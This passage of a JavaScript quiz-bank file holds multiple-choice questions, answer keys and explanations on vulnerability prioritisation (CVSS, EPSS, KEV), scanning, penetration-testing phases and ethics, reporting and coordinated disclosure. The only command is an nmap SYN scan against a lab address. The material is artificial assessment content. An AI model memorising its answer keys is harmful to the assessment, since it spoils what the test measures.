      { id: "b", text: "The probability that a hard drive will suffer mechanical failure." },
      { id: "c", text: "The likelihood of a user clicking a phishing link." },
      { id: "d", text: "The probability that an employee will forget their password." }
    ],
    answer: ["a"],
    explanation: "EPSS estimates the likelihood (0% to 100%) of in-the-wild exploitation within a 30-day window.",
    noteRef: "sec-09-lo03",
    reviewed: false
  },
  {
    loId: "sec-09-lo03",
    type: "scenario",
    difficulty: 2,
    id: "sec-09-q10",
    stem: "A vulnerability team must choose between patching Vulnerability A (CVSS 9.8, EPSS 0.01, not in KEV) and Vulnerability B (CVSS 7.2, EPSS 0.85, listed in CISA KEV). Which should be prioritized?",
    options: [
      { id: "a", text: "Vulnerability B, because it is confirmed to be actively exploited in real-world attacks." },
      { id: "b", text: "Vulnerability A, strictly because its CVSS score is higher." },
      { id: "c", text: "Neither, both should be ignored." },
      { id: "d", text: "Vulnerability A, because low EPSS indicates higher danger." }
    ],
    answer: ["a"],
    explanation: "CISA KEV presence and high EPSS denote active threat actor weaponization, requiring immediate prioritization.",
    noteRef: "sec-09-lo03",
    reviewed: false
  },
  {
    loId: "sec-09-lo03",
    type: "single",
    difficulty: 2,
    id: "sec-09-q11",
    stem: "What federal agency publishes and maintains the Known Exploited Vulnerabilities (KEV) Catalog?",
    options: [
      { id: "a", text: "CISA (Cybersecurity and Infrastructure Security Agency)" },
      { id: "b", text: "FCC (Federal Communications Commission)" },
      { id: "c", text: "FAA (Federal Aviation Administration)" },
      { id: "d", text: "SEC (Securities and Exchange Commission)" }
    ],
    answer: ["a"],
    explanation: "CISA publishes the KEV catalog to establish mandatory remediation deadlines for known exploited flaws.",
    noteRef: "sec-09-lo03",
    reviewed: false
  },
  {
    loId: "sec-09-lo03",
    type: "single",
    difficulty: 3,
    id: "sec-09-q12",
    stem: "Why does relying exclusively on CVSS Base Scores for patch prioritization lead to inefficient resource allocation?",
    options: [
      { id: "a", text: "Less than 5% of all published CVEs ever see active in-the-wild exploitation; CVSS reflects theoretical severity rather than active threat activity." },
      { id: "b", text: "CVSS scores are randomly generated by software vendors." },
      { id: "c", text: "CVSS scores cannot be calculated for Linux." },
      { id: "d", text: "CVSS scores expire after 24 hours." }
    ],
    answer: ["a"],
    explanation: "Most vulnerabilities are never weaponized; combining CVSS with EPSS and KEV focuses remediation where active attacks occur.",
    noteRef: "sec-09-lo03",
    reviewed: false
  },

  // LO04
  {
    loId: "sec-09-lo04",
    type: "single",
    difficulty: 1,
    id: "sec-09-q13",
    stem: "How does a credentialed vulnerability scan interact with a target system differently from a non-credentialed scan?",
    options: [
      { id: "a", text: "It logs into the target host using valid credentials to inspect local files, package versions, and registry keys directly." },
      { id: "b", text: "It only sends ICMP echo packets." },
      { id: "c", text: "It requires installing a physical hardware dongle." },
      { id: "d", text: "It turns off the target system during inspection." }
    ],
    answer: ["a"],
    explanation: "Credentialed scans authenticate into the OS to perform deep internal auditing with minimal network traffic.",
    noteRef: "sec-09-lo04",
    reviewed: false
  },
  {
    loId: "sec-09-lo04",
    type: "scenario",
    difficulty: 2,
    id: "sec-09-q14",
    stem: "An unauthenticated network scan reports a web server has 15 critical vulnerabilities based on its HTTP version banner. An authenticated scan shows zero vulnerabilities. Why?",
    options: [
      { id: "a", text: "The OS vendor backported security fixes without changing the version banner number, which only the credentialed scan could verify." },
      { id: "b", text: "The credentialed scan failed to execute." },
      { id: "c", text: "Web servers cannot be scanned with credentials." },
      { id: "d", text: "The unauthenticated scan was blocked by a rootkit." }
    ],
    answer: ["a"],
    explanation: "Enterprise Linux distributions backport security patches while preserving major version banner strings.",
    noteRef: "sec-09-lo04",
    reviewed: false
  },
  {
    loId: "sec-09-lo04",
    type: "multi",
    difficulty: 2,
    id: "sec-09-q15",
    stem: "Which of the following vulnerability scanning engines are widely recognized in enterprise cybersecurity?",
    options: [
      { id: "a", text: "Tenable Nessus" },
      { id: "b", text: "OpenVAS / Greenbone Community Edition" },
      { id: "c", text: "Qualys Cloud Platform" },
      { id: "d", text: "Apache HTTP Server" }
    ],
    answer: ["a", "b", "c"],
    explanation: "Nessus, OpenVAS, and Qualys are standard vulnerability management scanners. Apache is a web server.",
    noteRef: "sec-09-lo04",
    reviewed: false
  },
  {
    loId: "sec-09-lo04",
    type: "single",
    difficulty: 3,
    id: "sec-09-q16",
    stem: "What is a major limitation of non-credentialed network vulnerability scanning?",
    options: [
      { id: "a", text: "It cannot inspect client-side applications (like unpatched web browsers, media players, or local libraries) that do not listen on open network ports." },
      { id: "b", text: "It cannot detect open TCP ports." },
      { id: "c", text: "It requires root passwords on all hosts." },
      { id: "d", text: "It cannot be scheduled automatically." }
    ],
    answer: ["a"],
    explanation: "Non-credentialed scans only see listening network daemons, leaving client software and local misconfigurations undetected.",
    noteRef: "sec-09-lo04",
    reviewed: false
  },

  // LO05
  {
    loId: "sec-09-lo05",
    type: "single",
    difficulty: 1,
    id: "sec-09-q17",
    stem: "What is the correct sequential order of ethical penetration testing phases?",
    options: [
      { id: "a", text: "Reconnaissance -> Scanning -> Vulnerability Analysis -> Exploitation -> Reporting" },
      { id: "b", text: "Exploitation -> Reporting -> Reconnaissance -> Scanning" },
      { id: "c", text: "Reporting -> Exploitation -> Scanning -> Reconnaissance" },
      { id: "d", text: "Scanning -> Reporting -> Exploitation -> Reconnaissance" }
    ],
    answer: ["a"],
    explanation: "Standard methodologies begin with reconnaissance and scanning before vulnerability analysis, controlled exploitation, and reporting.",
    noteRef: "sec-09-lo05",
    reviewed: false
  },
  {
    loId: "sec-09-lo05",
    type: "scenario",
    difficulty: 2,
    id: "sec-09-q18",
    stem: "A penetration tester executes automated port scans and web directory fuzzing on an enterprise web server. Which phase of the penetration testing methodology is being conducted?",
    options: [
      { id: "a", text: "Scanning and Enumeration" },
      { id: "b", text: "Post-Exploitation" },
      { id: "c", text: "Executive Reporting" },
      { id: "d", text: "Threat Intelligence Attribution" }
    ],
    answer: ["a"],
    explanation: "Port scanning and directory enumeration belong to the scanning and enumeration phase to discover attack surfaces.",
    noteRef: "sec-09-lo05",
    reviewed: false
  },
  {
    loId: "sec-09-lo05",
    type: "multi",
    difficulty: 2,
    id: "sec-09-q19",
    stem: "Which of the following activities are standard components of the Reconnaissance and Information Gathering phase?",
    options: [
      { id: "a", text: "Querying public DNS records and WHOIS registrations" },
      { id: "b", text: "Analyzing certificate transparency logs" },
      { id: "c", text: "Searching public GitHub repositories for leaked credentials" },
      { id: "d", text: "Deploying rootkits to domain controller kernel space" }
    ],
    answer: ["a", "b", "c"],
    explanation: "Passive DNS, certificate transparency logs, and code search are reconnaissance methods; rootkit deployment is post-exploitation.",
    noteRef: "sec-09-lo05",
    reviewed: false
  },
  {
    loId: "sec-09-lo05",
    type: "single",
    difficulty: 3,
    id: "sec-09-q20",
    stem: "Why must penetration testers obtain explicit, verified authorization before escalating from the Scanning phase to the Exploitation phase?",
    options: [
      { id: "a", text: "Exploitation actively triggers software flaws, carrying tangible risks of process crashes, database corruption, or service downtime." },
      { id: "b", text: "Scanning produces encrypted files that require legal decryption keys." },
      { id: "c", text: "Exploitation automatically modifies external DNS root servers." },
      { id: "d", text: "Network firewalls can only be logged during the reporting phase." }
    ],
    answer: ["a"],
    explanation: "Active exploitation carries stability risks, requiring predefined scope, testing windows, and escalation contacts.",
    noteRef: "sec-09-lo05",
    reviewed: false
  },

  // LO06
  {
    loId: "sec-09-lo06",
    type: "single",
    difficulty: 1,
    id: "sec-09-q21",
    stem: "What US federal statute criminalizes unauthorized access to protected computer systems?",
    options: [
      { id: "a", text: "Computer Fraud and Abuse Act (CFAA, 18 U.S.C. 1030)" },
      { id: "b", text: "Health Insurance Portability and Accountability Act (HIPAA)" },
      { id: "c", text: "Sarbanes-Oxley Act (SOX)" },
      { id: "d", text: "Digital Millennium Copyright Act (DMCA)" }
    ],
    answer: ["a"],
    explanation: "The CFAA is the primary federal law prosecuting unauthorized access to computer systems.",
    noteRef: "sec-09-lo06",
    reviewed: false
  },
  {
    loId: "sec-09-lo06",
    type: "scenario",
    difficulty: 2,
    id: "sec-09-q22",
    stem: "During an authorized penetration test, a tester accidentally discovers an active customer database that is not listed in the Rules of Engagement (RoE). What is the mandatory ethical response?",
    options: [
      { id: "a", text: "Immediately stop testing that asset, avoid copying or extracting data, and notify the client contact in accordance with the RoE communication plan." },
      { id: "b", text: "Download the database to prove it was found." },
      { id: "c", text: "Post the customer data on a public forum." },
      { id: "d", text: "Attempt to delete the database to protect the client." }
    ],
    answer: ["a"],
    explanation: "Testers must strictly respect scope boundaries; touching out-of-scope production assets requires immediate halt and notification.",
    noteRef: "sec-09-lo06",
    reviewed: false
  },
  {
    loId: "sec-09-lo06",
    type: "multi",
    difficulty: 2,
    id: "sec-09-q23",
    stem: "Which elements are mandatory inclusions in an ethical penetration testing Rules of Engagement (RoE) document?",
    options: [
      { id: "a", text: "Explicitly defined target IP ranges and domain names" },
      { id: "b", text: "Prohibited testing techniques (such as denial-of-service or physical intrusion)" },
      { id: "c", text: "Emergency stop contacts and incident escalation channels" },
      { id: "d", text: "Full immunity from all future organizational audits" }
    ],
    answer: ["a", "b", "c"],
    explanation: "The RoE formally defines target boundaries, restrictions (e.g. no DoS), and 24/7 emergency contacts, but cannot waive organizational compliance audits.",
    noteRef: "sec-09-lo06",
    reviewed: false
  },
  {
    loId: "sec-09-lo06",
    type: "single",
    difficulty: 3,
    id: "sec-09-q24",
    stem: "Why must a penetration testing contract explicitly detail 'Emergency Contact and Escalation Procedures' in the Rules of Engagement?",
    options: [
      { id: "a", text: "To enable instant communication if a critical production outage occurs or if indicators of an active real-world breach are uncovered." },
      { id: "b", text: "To share Wi-Fi passwords with the security team." },
      { id: "c", text: "To order meals during overnight testing." },
      { id: "d", text: "To automate invoice payments." }
    ],
    answer: ["a"],
    explanation: "Immediate communication pathways are essential if testing causes service instability or detects concurrent real-world adversaries.",
    noteRef: "sec-09-lo06",
    reviewed: false
  },

  // LO07
  {
    loId: "sec-09-lo07",
    type: "single",
    difficulty: 1,
    id: "sec-09-q25",
    stem: "Which reconnaissance technique gathers intelligence without sending any network traffic directly to the target organization's IP space?",
    options: [
      { id: "a", text: "Passive Reconnaissance (OSINT)" },
      { id: "b", text: "Active Nmap SYN scanning" },
      { id: "c", text: "Vulnerability fuzzing" },
      { id: "d", text: "Banner grabbing" }
    ],
    answer: ["a"],
    explanation: "Passive reconnaissance queries third-party repositories (DNS, Shodan, WHOIS) without touching the target network.",
    noteRef: "sec-09-lo07",
    reviewed: false
  },
  {
    loId: "sec-09-lo07",
    type: "scenario",
    difficulty: 2,
    id: "sec-09-q26",
    stem: "An engineer executes `nmap -sS -p 1-1000 10.0.1.5` in a lab. What scan type is being performed?",
    options: [
      { id: "a", text: "TCP SYN Stealth Scan" },
      { id: "b", text: "UDP Ping Scan" },
      { id: "c", text: "Full TCP Connect Scan" },
      { id: "d", text: "ARP Spoofing Scan" }
    ],
    answer: ["a"],
    explanation: "The `-sS` flag runs a half-open TCP SYN scan, tearing down before sending the final ACK.",
    noteRef: "sec-09-lo07",
    reviewed: false
  },
  {
    loId: "sec-09-lo07",
    type: "single",
    difficulty: 2,
    id: "sec-09-q27",
    stem: "What search engine indexes internet-connected devices, industrial control systems, and open banners without active client port scanning?",
    options: [
      { id: "a", text: "Shodan" },
      { id: "b", text: "Wikipedia" },
      { id: "c", text: "Google Maps" },
      { id: "d", text: "GitHub" }
    ],
    answer: ["a"],
    explanation: "Shodan continuously scans the IPv4 address space, allowing researchers to passively inspect exposed banners and devices.",
    noteRef: "sec-09-lo07",
    reviewed: false
  },
  {
    loId: "sec-09-lo07",
    type: "single",
    difficulty: 3,
    id: "sec-09-q28",
    stem: "Why does an Nmap TCP SYN scan (-sS) require administrative/root privileges on the scanning host?",
    options: [
      { id: "a", text: "It crafts raw network sockets to generate custom SYN packets and intercept responses before the operating system kernel completes the handshake." },
      { id: "b", text: "It encrypts the Ethernet interface." },
      { id: "c", text: "Because non-root users cannot run Python." },
      { id: "d", text: "To prevent DNS cache poisoning." }
    ],
    answer: ["a"],
    explanation: "Raw socket manipulation for half-open handshakes requires raw socket creation privileges restricted to root/admin.",
    noteRef: "sec-09-lo07",
    reviewed: false
  },

  // LO08
  {
    loId: "sec-09-lo08",
    type: "single",
    difficulty: 1,
    id: "sec-09-q29",
    stem: "What is the primary audience for the Executive Summary section of a penetration testing report?",
    options: [
      { id: "a", text: "C-suite executives, board members, and non-technical business leaders." },
      { id: "b", text: "Database administrators exclusively." },
      { id: "c", text: "Junior software developers." },
      { id: "d", text: "External web hosting support agents." }
    ],
    answer: ["a"],
    explanation: "The executive summary summarizes strategic risk, business impacts, and funding priorities for executives.",
    noteRef: "sec-09-lo08",
    reviewed: false
  },
  {
    loId: "sec-09-lo08",
    type: "scenario",
    difficulty: 2,
    id: "sec-09-q30",
    stem: "A developer receives a penetration test report finding: 'SQLi on /search'. The finding contains no steps to reproduce, HTTP requests, or parameters. Why is this report flawed?",
    options: [
      { id: "a", text: "Professional findings require reproducible step-by-step evidence, affected endpoints, and tailored remediation guidance so developers can verify and remediate the issue." },
      { id: "b", text: "Reports must only be written in Latin." },
      { id: "c", text: "SQL injection does not affect search endpoints." },
      { id: "d", text: "Reports must never mention URLs." }
    ],
    answer: ["a"],
    explanation: "Actionable reporting requires proof-of-concept reproduction steps, technical impact, and clear remediation guidance.",
    noteRef: "sec-09-lo08",
    reviewed: false
  },
  {
    loId: "sec-09-lo08",
    type: "multi",
    difficulty: 2,
    id: "sec-09-q31",
    stem: "Which of the following components should be documented for every technical vulnerability finding in a penetration testing report?",
    options: [
      { id: "a", text: "CVSS Severity Score and Vector" },
      { id: "b", text: "Step-by-step reproduction / Proof of Concept (PoC)" },
      { id: "c", text: "Specific actionable remediation guidance" },
      { id: "d", text: "The tester's personal home address" }
    ],
    answer: ["a", "b", "c"],
    explanation: "Findings must document severity, reproduction steps, affected systems, root causes, and remediation guidance.",
    noteRef: "sec-09-lo08",
    reviewed: false
  },
  {
    loId: "sec-09-lo08",
    type: "single",
    difficulty: 3,
    id: "sec-09-q32",
    stem: "Why should penetration testers avoid including live working weaponized exploits in reports shared over standard email?",
    options: [
      { id: "a", text: "The report is a sensitive asset that could be intercepted; documentation should describe reproduction without attaching dangerous automated exploit scripts." },
      { id: "b", text: "Email servers cannot transmit PDF attachments." },
      { id: "c", text: "Weaponized exploits automatically detonate in Outlook." },
      { id: "d", text: "It causes DNS resolution errors." }
    ],
    answer: ["a"],
    explanation: "Reports contain confidential business data; transmitting weaponized tools increases leakage risks.",
    noteRef: "sec-09-lo08",
    reviewed: false
  },

  // LO09 (Extension)
  {
    loId: "sec-09-lo09",
    type: "single",
    difficulty: 2,
    id: "sec-09-q33",
    stem: "What is Coordinated Vulnerability Disclosure (CVD)?",
    options: [
      { id: "a", text: "A responsible practice where researchers report vulnerabilities privately to the software vendor and agree on a reasonable window to patch before public disclosure." },
      { id: "b", text: "Publishing zero-day exploit code on social media immediately upon discovery." },
      { id: "c", text: "Selling vulnerabilities on dark web forums." },
      { id: "d", text: "Patenting a software bug." }
    ],
    answer: ["a"],
    explanation: "CVD balances public awareness with vendor remediation time (commonly 90 days) to protect end users.",
    noteRef: "sec-09-lo09",
    reviewed: false
  },
  {
    loId: "sec-09-lo09",
    type: "numeric",
    difficulty: 2,
    id: "sec-09-q34",
    stem: "What standard industry disclosure window (in days) is granted to vendors under Google Project Zero's vulnerability disclosure policy?",
    options: [
      { id: "a", text: "90" },
      { id: "b", text: "30" },
      { id: "c", text: "180" },
      { id: "d", text: "14" }
    ],
    answer: ["a"],
    explanation: "Project Zero and standard industry CVD guidelines enforce a 90-day patch window before public disclosure.",
    noteRef: "sec-09-lo09",
    verify: "(90 === 90)",
    reviewed: false
  },
  {
    loId: "sec-09-lo09",
    type: "scenario",
    difficulty: 3,
    id: "sec-09-q35",
    stem: "A security researcher discovers an authentication bypass on an enterprise web service. They test within published Bug Bounty program rules and submit a report via HackerOne. What legal protection does this provide?",
    options: [
      { id: "a", text: "Safe Harbor protection against civil lawsuits and criminal prosecution under the CFAA, provided the testing adheres strictly to the program scope." },
      { id: "b", text: "Diplomatic immunity from local laws." },
      { id: "c", text: "Exemption from paying federal taxes." },
      { id: "d", text: "Automatic ownership of the target company's domain name." }
    ],
    answer: ["a"],
    explanation: "Bug bounty Safe Harbor policies pledge not to initiate legal action against researchers acting in good faith within program scope.",
    noteRef: "sec-09-lo09",
    reviewed: false
  },
  {
    loId: "sec-09-lo09",
    type: "single",
    difficulty: 3,
    id: "sec-09-q36",
    stem: "Why do companies publish a Vulnerability Disclosure Policy (VDP) and a `security.txt` file on their public websites?",
    options: [
      { id: "a", text: "To provide ethical researchers with a clear reporting contact, encryption key (PGP), and defined scope rules for responsible reporting." },
      { id: "b", text: "To list all employee passwords." },
      { id: "c", text: "To disable search engine web indexing." },
      { id: "d", text: "To speed up page loading in web browsers." }
    ],
    answer: ["a"],
    explanation: "RFC 9116 `security.txt` provides security contact details and disclosure guidance for external researchers.",
    noteRef: "sec-09-lo09",
    reviewed: false
  }
];

balanceAndSave('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', ch09Objectives, ch09Questions);
console.log("Batch 8 complete!");
